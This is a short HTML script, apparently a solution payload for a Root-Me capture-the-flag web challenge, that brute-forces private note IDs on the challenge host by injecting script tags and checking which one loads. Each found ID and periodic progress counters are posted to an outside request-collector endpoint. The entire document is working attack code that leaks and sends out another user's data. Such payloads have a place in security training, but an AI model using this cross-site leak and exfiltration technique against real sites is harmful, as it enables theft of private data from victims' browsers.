<script>
function sendRequest(url) {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
    xhr.send(url);
}

var idFound = false;
    
async function attack() {
    let i = 0;
    while (!idFound) {
        try {
            await new Promise((resolve, reject) => {
                //fetch page
                var script = document.createElement('script');
                script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${i}`;
                document.body.appendChild(script);
                
                // When script loads, caculate the time it took to finish the request
                script.onload = () => {
                    idFound = true;
                    sendRequest(`id=${i}`);
                    resolve();
                }
                script.onerror = reject;
                if (i % 100000 == 0) sendRequest("test="+i)
            })
            
        } catch (error) {
            i+=1;
            continue;
        }
    }      
}
attack();
</script>
